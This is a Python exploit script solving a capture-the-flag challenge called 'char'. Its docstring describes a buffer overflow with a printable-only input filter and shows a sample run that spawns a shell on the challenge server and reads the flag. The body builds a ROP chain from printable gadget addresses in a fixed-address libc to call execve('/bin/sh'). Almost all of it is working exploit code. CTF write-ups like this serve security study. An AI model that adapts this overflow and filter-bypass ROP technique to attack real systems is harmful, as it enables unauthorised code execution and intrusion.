"""
Author: rick2600
Notes:
  1. The binary loads a libc at a fixed location 0x5555e000
  2. The bug is a simple buffer overflow
  3. The binary accepts only printable input (range: 0x20-0x7e)
Solution: 
  Printable rop chain to jump in the middle of execve with ebx, ecx, edx controlled
$ python char.py 
[+] Opening connection to 202.120.7.214 on port 23222: Done
You maybe feel some familiar with this challenge ? 
Yes, I made a little change 
GO : )
[*] Switching to interactive mode
 
$ cat /home/char/flag
flag{Asc11_ea3y_d0_1t???}
"""

from pwn import *

rop = "A" * 32

# set ecx = 0
rop += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
rop += p32(0x41414141)
rop += p32(0x41414141)
rop += p32(0x556d2a51) # pop ecx ; add al, 0xa ; ret
rop += p32(0x41414141)
rop += p32(0x55655b4c) # sub ecx, edx ; add esp, 0x4c ; mov eax, ecx ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
rop += "A" * 0x4c
rop += p32(0x41414141) * 4

# set eax = 0x5563704d (ret)
rop += p32(0x555f3555) # pop edx ; xor eax, eax ; pop edi ; ret
rop += p32(0x5563704d) # edx
rop += p32(0x41414141) # edi
rop += p32(0x555b3454) # mov eax, edx ; ret

# ebx = '...///////bin/sh'
rop += p32(0x55643026) # push eax ; push esp ; xor eax, eax ; pop ebx ; ret
rop += p32(0x556a3457) # xor eax, eax ; ret
rop += p32(0x556c6864) # inc eax ; ret 0
rop += p32(0x556d2860) * 2 # add ah, al ; ret
rop += p32(0x55634e43) # add bh, ah ; ret

# set edx = 0
rop += p32(0x55617940) # mov edx, 0xffffffff ; cmovne eax, edx ; ret
rop += p32(0x555e7a4b) # inc edx ; add al, 0x5f ; ret

# esi = execve+0x23 0x55616603
rop += p32(0x55623c37) # pop esi ; ret
rop += p32(0x55616621) 
rop += p32(0x556f4237) * (0x21-0x3) # dec esi
rop += p32(0x556e552c) # push esi; ret

rop += "/" * 500 + "/bin/sh"
print('%s'%(rop))